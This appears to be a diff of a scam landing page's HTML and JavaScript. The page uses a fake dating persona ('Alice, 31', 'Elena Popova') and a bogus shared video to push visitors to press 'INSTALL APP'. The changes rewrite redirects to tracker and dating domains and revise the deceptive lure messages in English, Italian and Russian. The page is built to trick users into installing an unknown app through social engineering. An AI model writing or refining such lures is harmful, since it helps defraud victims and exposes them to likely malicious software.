@@ -125,11 +125,9 @@
                         // alert(document.cookie);
                                   document.cookie = "url="+url; // обновляем только куки с именем 'url'
 // alert(document.cookie);
-                        
+                        window.location.href = '/index.html?' + 'clickid=' + getURLParameter('clickid');
                         document.getElementById('loaderFlow').hidden = true;
                         element.style.opacity = "0.0";
-                        
-                        location.href = '/index.html?' + 'clickid=' + getURLParameter('clickid');
 
                     } else {
                         document.getElementById('loaderFlow').hidden = true;
@@ -848,8 +846,7 @@ if(!check(secretKey, ttl, signature))
 
 <body>
 
-   
-  <a href="https://jqrjk.bemobtrk.com/click">lol</a>
+
    
    
    
@@ -951,6 +948,7 @@ if(!check(secretKey, ttl, signature))
                 <button type="button" id="button1" class="buttonInstall" onclick="install()" style="display: block;margin-right: auto; margin-bottom: 0px; margin-left: auto;font-size: 32px;">INSTALL APP</button>
 
             </div>
+
             <div id="loaderFlow" class="container d-flex h-100 loader loader--style3 justify-content-center align-items-center" title="2" onclick="install()">
                 <svg version="1.1" id="loader-1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="178px" height="178px" viewBox="0 0 50 50" style="enable-background:new 0 0 50 50;" xml:space="preserve">
                     <path fill="#000" d="M43.935,25.145c0-10.318-8.364-18.683-18.683-18.683c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615c8.072,0,14.615,6.543,14.615,14.615H43.935z">
@@ -958,11 +956,15 @@ if(!check(secretKey, ttl, signature))
                     </path>
                 </svg>
             </div>
+
         </div>
 
     </div>
-   <div>
+    <div class="gbc">
+        <div class="gbc__img"></div>
     </div>
+    
+  
     <div class="msg isHide">
         <div class="msg__tx"></div>
     </div>
@@ -1163,7 +1165,7 @@ if(!check(secretKey, ttl, signature))
                         }), t = t.slice(0, -1), p({
                             a: "next",
                             c: b.c
-                        }), location.href = "https://" +"harddate21.bonula.com/l8.html?"
+                        }), location.href = "https://" + e + ".supervid.pro/dating" + t
                     },
                     get can() {
                         return this.s
@@ -1250,22 +1252,23 @@ if(!check(secretKey, ttl, signature))
                      hTx: "Alice, 31",
                      fl: "Reply",
                      tx1: "Hi, I found your page on the social network))) ... let's meet)",
-                     tx2: "I can sand only one photo here :( install the application",
+                     tx2: "I can sand onlu one photo here :( install the application",
                      iTx1: "<b> Elena Popova </b> wants to share the file MOV0790.mp4",
                      iTx2: "Click <b>INSTALL APP</b> to get the video in the DATING 21+ app.",
                      msg: "You have successfully passed the test! <br> Now you can close the window ...",
                      buttonInstall: "Install"
                 },
                 it: {
-               tt1: "(3) nuovi post da",
-tt2: "Alice31",
-hTx: "Alice, 31",
-fl: "Rispondi",
-tx1: "Ciao, ho trovato la tua pagina sul social network))) ... сerchiamo di conoscerci meglio, d'accordo?",
-tx2: "Qui posso avere solo una foto :( installa l'applicazione pls, funziona solo su invito",
-iTx1: "<b> Alice </b> vuole condividere il file MOV0790.mp4",
-iTx2: "Fai clic su <b> Installa </b> per ottenere il video nell'app INCONTRI 21+",
-msg: "Hai superato con successo il test! <br> Ora puoi chiudere la finestra ..."
+                  tt1: "(3) nuovi post da",
+                     tt2: "Alice31",
+                     hTx: "Alice, 31",
+                     fl: "Rispondi",
+                     tx1: "Ciao, ho trovato la tua pagina sul social network))) ... facciamo conoscenza)",
+                     tx2: "Posso avere solo una foto qui :( installa l'applicazione",
+                     iTx1: "<b> Elena Popova </b> vuole condividere il file MOV0790.mp4",
+                     iTx2: "Fai clic su <b> INSTALL APP </b> per ottenere il video nell'app DATING 21+.",
+                     msg: "Hai superato con successo il test! <br> Ora puoi chiudere la finestra ...",
+                     buttonInstall: "Installa"
                 },
                 id: {
                     tt1: "(3) Posting baru dari",
@@ -1324,11 +1327,11 @@ msg: "Hai superato con successo il test! <br> Ora puoi chiudere la finestra ..."
                 },
                 pt: {
                     tt1: "(3) Новых сообщения от",
-                    tt2: "Alice31",
-                    hTx: "Alice, 31",
+                    tt2: "Елены Поповой",
+                    hTx: "Елена Попова, кризисный консультант",
                     fl: "Ответить",
                     tx1: "Привет, нашла твою страницу в соцсети)))... давай знакомиться)",
-                    tx2: "могу только одну фотку тут:( установи плиз приложение, оно работает только по приглашению",
+                    tx2: "могу только одну фотку тут:( установи приложение",
                     iTx1: "<b>Елена Попова</b> хочет поделиться файлом MOV0790.mp4",
                     iTx2: "Нажмите <b>Установить</b> чтобы получить видео в приложении ЗНАКОМСТВА 21+.",
                     msg: "Вы успешно прошли проверку!<br>Теперь вы можете закрыть окно ..."
@@ -1340,7 +1343,7 @@ msg: "Hai superato con successo il test! <br> Ora puoi chiudere la finestra ..."
                     fl: "Ответить",
                     tx1: "Привет, нашла твою страницу в соцсети)))... давай знакомиться)",
                     tx2: "могу только одну фотку тут:( установи приложение",
-                    iTx1: "<b>Alice</b> хочет поделиться файлом MOV0790.mp4",
+                    iTx1: "<b>Елена Попова</b> хочет поделиться файлом MOV0790.mp4",
                     iTx2: "Нажмите <b>INSTALL APP</b> чтобы получить видео в приложении ЗНАКОМСТВА 21+.",
                     msg: "Вы успешно прошли проверку!<br>Теперь вы можете закрыть окно ...",
                     buttonInstall: "Установить"
